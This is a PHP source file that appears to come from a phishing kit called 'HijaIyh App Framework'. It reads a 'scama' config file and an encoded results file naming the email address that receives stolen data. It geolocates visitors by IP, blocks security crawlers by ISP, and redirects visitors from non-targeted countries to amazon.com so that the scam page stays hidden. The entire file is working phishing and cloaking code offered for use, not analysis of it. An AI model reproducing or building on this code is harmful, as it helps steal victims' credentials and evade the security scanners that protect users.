<?php 
/** HijaIyh App Framework
* @author justalinko
* @version 2.1
**/

$sfile = __DIR__.'/config/scama.iyh.json';
$rfile = __DIR__.'/config/result.iyh.json';
$dotStatus = __DIR__.'/config/.status_hijaiyh';

if(!file_exists($dotStatus) || file_exists($dotStatus) && file_get_contents($dotStatus) != 'active')
{
	require_once(__DIR__.'/hijaiyh4.init.php');exit;
}

$lc['ip'] = $core->userIP();

if(isset($_SESSION['country']) && isset($_SESSION['countryCode']) && isset($_SESSION['isp']))
{
    $lc['country'] = $_SESSION['country'];
    $lc['countryCode'] = $_SESSION['countryCode'];
    $lc['isp'] = $_SESSION['isp'];
}else{
$_SESSION['country'] = $lc['country'] = $api->country($lc['ip'])['country'];
$_SESSION['countryCode'] = $lc['countryCode'] = $api->country($lc['ip'])['countryCode'];
$_SESSION['isp'] = $lc['isp'] = $api->country($lc['ip'])['isp'];
}

$blocker->run_blocker($lc['isp'],array($API_URL,$kiakun,$kiapi));

$core->create_session(['country_' => $lc['country']]);

if($core->parse_hijaiyh('lc','lock_lang') == 1)
{
	$lc['lang'] = $core->parse_hijaiyh('lc','default_lang');
}else{
	$lc['lang'] = $locales->langcountry($lc['countryCode']);
}

if($core->parse_hijaiyh('lc','lock_country') == 1)
{
	if(strtolower($lc['countryCode']) != strtolower($core->parse_hijaiyh('lc','allowed_country')))
	{
		$core->stats('bot','Country blacklisted because lock country ('.$core->parse_hijaiyh('lc','allowed_country').' ) active |'.$lc['countryCode']);
		$core->redirect('https://amazon.com');
		exit;
	}
}

// aliases

$userIP = $lc['ip'];
$country_name = $lc['country'];
$locale =$lc['lang'].'_'.$lc['countryCode'];
$pirul = parse_url($_SERVER['REQUEST_URI']);
$epir = explode("=",$pirul['query']);
$skey = @$epir[1];
$localex = @$epir[2];
$clang = explode("_",$localex);
$lang = @$clang[0];
$country_code = @$clang[1];
// config result
$all_result = json_decode($iki->decodefile(__DIR__.'/config/result.iyh.json','HijaIyh_App'),true);
$email_result = $all_result['result_email'];